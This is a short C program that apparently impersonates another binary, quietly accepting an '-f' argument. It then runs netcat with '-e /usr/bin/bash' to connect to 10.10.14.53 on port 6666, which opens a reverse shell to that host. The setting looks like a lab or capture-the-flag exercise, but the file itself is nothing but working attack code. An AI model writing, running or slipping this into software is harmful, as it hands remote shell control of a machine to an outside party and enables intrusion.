#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    for(int i = 1; i < argc; i++) {
        if(strcmp(argv[i], "-f") == 0) {
            if(i + 1 < argc) {
                i++;
            }
        }
    }
    char *args[] = {"nc", "10.10.14.53", "6666", "-e", "/usr/bin/bash", NULL};
    execvp("nc", args);
    perror("execvp");
    return 1;
}
